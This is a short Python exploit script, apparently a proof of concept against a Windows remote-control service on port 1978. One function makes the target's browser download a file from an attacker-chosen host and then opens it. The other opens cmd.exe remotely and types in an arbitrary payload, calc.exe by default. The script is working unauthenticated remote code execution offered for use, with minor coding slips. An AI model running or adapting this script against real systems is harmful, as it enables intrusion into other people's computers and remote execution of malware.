import socket
import struct
import sys
import time

def exploit():
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((target,port))
    print("f[!] Downloading {filename} from http://{ip}:{port}!")
    buf = b"browser openurl http://"+ip+b":"+port+b"/"+filename+b"\n"
    s.send(buf)
    print(f"[!] Executing {filename} on target")
    buf = b"openfile C:\\Users\\%USERNAME%\\Downloads\\"+filename+b"\n"
    s.send(buf)
    print("[!] Executed!")
    s.close()

def exploit2(target,port,payload):
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((target,port))

    print(f"[!] Opening cmd.exe!")
    buf = b"openfile C:\\Windows\\System32\\cmd.exe\n"
    s.send(buf)

    time.sleep(1)

    print(f"[!] Executing {payload.decode()} in cmd")
    
    buf = b"utf8 "+payload+b"\r\r\n"
    #buf = b"utf8 cacl.exe\r\r\n\r\n"
    s.send(buf)
    
    time.sleep(1)
    print(f"[+] Payload executed")
    s.close()

if __name__ == "__main__":

    target = sys.argv[1]
    port = 1978                 # Obtained by looking at tcpview 
    payload = b"calc.exe" 
    exploit2(target,port,payload)
